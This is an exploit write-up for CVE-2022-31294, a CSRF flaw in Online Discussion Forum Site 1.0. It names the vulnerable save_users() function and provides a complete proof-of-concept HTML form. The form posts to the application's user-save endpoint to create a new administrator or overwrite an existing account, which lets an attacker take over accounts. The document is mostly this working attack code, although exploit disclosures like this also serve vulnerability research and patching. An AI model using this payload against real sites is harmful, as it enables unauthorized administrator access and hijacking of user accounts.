# CVE-2022-31294

Online Discussion Forum Site 1.0 - Account Takeover

#### Exploit Title: Online Discussion Forum Site 1.0 - CSRF Create New/Update Existing Admin User _[Account Takeover]_
#### Date:  2022-06-13
#### CVE:  CVE-2022-31294
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15337/online-discussion-forum-site-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----


[#] Vulnerability Location:
	`function save_users()` in `/odfs/classes/Users.php:13`

----

[#] Exploitation:
	```
	 <form action="http://localhost/odfs/classes/Users.php?f=save" method="post" id="manage-user">	
				<input type="text" name="id" value="" placeholder="Keep empty if you want to create new user / put user ID to edit existing user">
				<div class="form-group">
					<label for="name">First Name</label>
					<input type="text" name="firstname" id="firstname" class="form-control" value="" required>
				</div>
				<div class="form-group">
					<label for="name">Middle Name</label>
					<input type="text" name="middlename" id="middlename" class="form-control" value="">
				</div>
				<div class="form-group">
					<label for="name">Last Name</label>
					<input type="text" name="lastname" id="lastname" class="form-control" value="" required>
				</div>
				<div class="form-group">
					<label for="username">Username</label>
					<input type="text" name="username" id="username" class="form-control" value="" required  autocomplete="off">
				</div>
				<div class="form-group">
					<label for="password"> Password</label>
					<input type="password" name="password" id="password" class="form-control" value="" autocomplete="off">
                    				</div>
                <div class="form-group">
                    <label for="type" class="control-label">Type</label>
                    <select name="type" id="type" class="form-control form-control-sm rounded-0" required>
                    <option value="1" >Administrator</option>
                    <option value="2" >Registered User</option>
                    </select>
                </div>
                <button type="submit">Save</button>
	</form>
	```
